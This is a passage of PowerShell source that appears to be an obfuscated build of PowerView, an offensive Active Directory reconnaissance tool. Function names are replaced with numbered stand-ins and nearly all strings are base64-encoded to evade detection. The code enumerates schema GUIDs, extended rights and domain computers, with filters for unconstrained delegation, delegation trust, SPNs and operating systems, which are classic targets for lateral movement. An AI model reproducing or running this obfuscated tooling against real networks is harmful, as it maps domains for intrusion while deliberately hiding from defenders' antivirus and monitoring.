        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    if (-not ${464}) {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    ${48} = @{
        'SearchBase' = ${464}
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${465} = f74 @48
    if (${465}) {
        try {
            ${72} = ${465}.FindAll()
            ${72} | ? {$_} | % {
                ${430}[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${465}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = ${464}.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA'))))
    ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
    ${463} = f74 @48
    if (${463}) {
        try {
            ${72} = ${463}.FindAll()
            ${72} | ? {$_} | % {
                ${430}[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${463}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${430}
}
function f79 {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,
        [Switch]
        ${f5},
        [Switch]
        ${f32},
        [Switch]
        ${f31},
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        ${f29},
        [ValidateNotNullOrEmpty()]
        [String]
        ${f4},
        [ValidateNotNullOrEmpty()]
        [String]
        ${f3},
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [Switch]
        ${f30},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${461} = [Enum]::GetNames(${23})
        ${461} = ${461} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        f115 -Name UACFilter -ValidateSet ${461} -f19 ([array])
    }
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${462} = f74 @48
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            f115 -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${462}) {
            ${251} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAyADUAMgB9ACkA')))
                }
                elseif (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADIANQA0AH0AJwAgAGYAcgBvAG0AIAAnACQAewAyADUAMgB9ACcA')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                        ${462} = f74 @48
                        if (-not ${462}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAMgA1ADQAfQAnAA==')))
                        }
                    }
                }
                elseif (${252}.Contains('.')) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAbgBhAG0AZQA9ACQAewAyADUAMgB9ACkAKABkAG4AcwBoAG8AcwB0AG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApACkA')))
                }
                elseif (${252} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${253} = (([Guid]${252}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                }
                else {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQA=')))
                }
            }
            if (${251} -and (${251}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABoAGEAdAAgAGEAcgBlACAAdAByAHUAcwB0AGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAZgBvAHIAIABvAHQAaABlAHIAIABwAHIAaQBuAGMAaQBwAGEAbABzAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAA==')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAFMAUABOADoAIAAkAHsAZgAyADkAfQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAkAHsAZgAyADkAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAG8AcABlAHIAYQB0AGkAbgBnACAAcwB5AHMAdABlAG0AOgAgACQAewBmADQAfQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQA9ACQAewBmADQAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAZQByAHYAaQBjAGUAIABwAGEAYwBrADoAIAAkAHsAZgAzAH0A')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQBzAGUAcgB2AGkAYwBlAHAAYQBjAGsAPQAkAHsAZgAzAH0AKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAaQB0AGUAIABuAGEAbQBlADoAIAAkAFMAaQB0AGUATgBhAG0AZQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGUAcgByAGUAZgBlAHIAZQBuAGMAZQBiAGwAPQAkAFMAaQB0AGUATgBhAG0AZQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${458} = $_.Substring(4)
                    ${457} = [Int](${23}::${458})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsANAA1ADcAfQApACkA')))
                }
                else {
                    ${457} = [Int](${23}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewA0ADUANwB9ACkA')))
                }
            }
            ${462}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADkAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $(${462}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${462}.FindOne() }
            else { ${72} = ${462}.FindAll() }
            ${72} | ? {$_} | % {
                ${93} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABpAG4AZwA=')))]) {
                    ${93} = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if (${93}) {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${116} = $_
                        ${116}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIALgBSAGEAdwA='))))
                    }
                    else {
                        ${116} = f104 -Properties $_.Properties
                        ${116}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIA'))))
                    }
                    ${116}
                }
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${462}.dispose()
        }
    }
}
function f98 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${461} = [Enum]::GetNames(${23})
        ${461} = ${461} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        f115 -Name UACFilter -ValidateSet ${461} -f19 ([array])
    }
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
